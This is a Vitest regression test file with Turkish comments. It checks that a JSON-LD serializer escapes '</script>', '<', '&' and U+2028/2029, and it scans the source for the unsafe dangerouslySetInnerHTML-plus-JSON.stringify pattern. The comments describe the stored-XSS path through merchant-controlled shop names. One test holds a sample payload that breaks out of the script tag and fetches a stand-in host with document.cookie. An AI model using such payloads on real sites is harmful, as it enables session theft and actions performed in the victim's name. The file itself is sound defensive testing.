import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import { serializeJsonLd } from "@/lib/json-ld-script";

/**
 * JSON-LD `<script>` ETIKETINDEN CIKAMAZ — depolanmis XSS mandali.
 *
 * NEDEN VAR (2026-08-31'de olculdu): on yedi yerde JSON-LD soyle basiliyordu:
 *
 *     <script type="application/ld+json"
 *       dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
 *
 * `JSON.stringify` gecerli JSON uretir ama HTML baglamini BILMEZ: `<`
 * karakterini kacirmaz. `dangerouslySetInnerHTML` de adinin soyledigi gibi
 * hicbir sey kacirmaz. Yani govdedeki bir dize `</script>` icerirse tarayici
 * script'i orada KAPATIR ve devamini HTML olarak ayristirir.
 *
 * ISTISMAR YOLU somut ve ELLE OLCULDU: `shop.name` ve `shop.address` JSON-LD'ye
 * dogrudan giriyor (`src/lib/shop-json-ld.ts`) ve ikisi de ESNAF KONTROLUNDE
 * (`updateShopSettingsAction` adresi 500 karaktere kadar kabul ediyor). Bir
 * esnaf dukkan adina `</script><script>...</script>` yazarsa, o dukkanin
 * sayfasini acan HERKES o script'i calistirir.
 *
 * Ve CALISIR: `next.config.ts` icindeki CSP `script-src`'de `'unsafe-inline'`
 * var -- Next'in kendi acilis script'leri icin, nonce'a gecilene kadar bilincli
 * bir taviz. Yani CSP burada ikinci bir savunma DEGIL.
 *
 * Oturum cerezi `httpOnly`, yani cerez calinmaz. Ama saldirgan kurbanin
 * tarayicisinda DOM'u okuyabilir ve onun adina server action cagirabilir; o
 * sayfayi acan bir YONETICI icin bu, yonetici yetkisiyle istek demek.
 */

const ROOT = path.resolve(__dirname, "../..");

/**
 * Yorumlar ayiklanir: bu dosyalarin bir kismi HATALI kalibi ORNEK olarak
 * gosteren aciklamalar tasiyor. (`service-layer-writes` mandali ayni tuzaga bir
 * kez dusmustu; bu tarama ilk kosusunda kendi belgelendirmesini isaretledi.)
 */
function stripComments(src: string): string {
  return src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
}

function walk(dir: string, out: string[] = []): string[] {
  if (!fs.existsSync(dir)) return out;
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) {
      if (e.name === "__tests__") continue;
      walk(p, out);
    } else if (/\.tsx?$/.test(e.name)) {
      out.push(p);
    }
  }
  return out;
}

describe("JSON-LD script etiketinden cikamaz", () => {
  it("hicbir yerde `dangerouslySetInnerHTML` + ham `JSON.stringify` yok", () => {
    const offenders: string[] = [];
    for (const file of walk(path.join(ROOT, "src"))) {
      const src = stripComments(fs.readFileSync(file, "utf8"));
      const re = /dangerouslySetInnerHTML=\{\{\s*__html:\s*JSON\.stringify\(/g;
      for (const m of src.matchAll(re)) {
        const line = src.slice(0, m.index!).split("\n").length;
        offenders.push(`${path.relative(ROOT, file)}:${line}`);
      }
    }
    expect(
      offenders,
      "Ham `JSON.stringify` bir `<script>` govdesine basiliyor. " +
        "`JSON.stringify` `<` karakterini KACIRMAZ, yani icerideki bir " +
        "`</script>` baglamdan cikar. `serializeJsonLd()` kullanin:\n" +
        offenders.join("\n"),
    ).toEqual([]);
  });

  it("`</script>` govdeden cikamaz", () => {
    /*
      Gercek saldiri yuku: esnafin dukkan adina yazabildigi dize.
    */
    const payload = '</script><script>fetch("https://kotu/"+document.cookie)</script>';
    const out = serializeJsonLd({ name: payload });

    expect(out, "kacirilmis ciktida ham `</script>` bulunmamali").not.toContain(
      "</script>",
    );
    expect(out).not.toContain("<");
    expect(out).toContain("\\u003c");
  });

  it("anlam DEGISMEZ: `JSON.parse` ayni nesneyi uretir", () => {
    /*
      Kacis, JSON dizesi ICINDE `\\uXXXX` olarak yaziliyor -- yani schema.org
      ciktisi birebir ayni kalir. Kacirmanin SEO'yu bozmadigi burada olculuyor.
    */
    const original = {
      "@context": "https://schema.org",
      "@type": "LocalBusiness",
      name: 'Emanet & Co <Kadıköy>',
      description: "Moda Cd. no:1 — 2. kat",
    };
    expect(JSON.parse(serializeJsonLd(original))).toEqual(original);
  });

  it("JavaScript'te satir sonu sayilan U+2028 / U+2029 de kacirilir", () => {
    const out = serializeJsonLd({ name: "a b c" });
    expect(out).not.toContain(" ");
    expect(out).not.toContain(" ");
    expect(JSON.parse(out).name).toBe("a b c");
  });

  it("`&` kacirilir (HTML varlik ayristirmasi)", () => {
    const out = serializeJsonLd({ name: "Emanet &amp; Co" });
    expect(out).not.toContain("&");
    expect(JSON.parse(out).name).toBe("Emanet &amp; Co");
  });
});
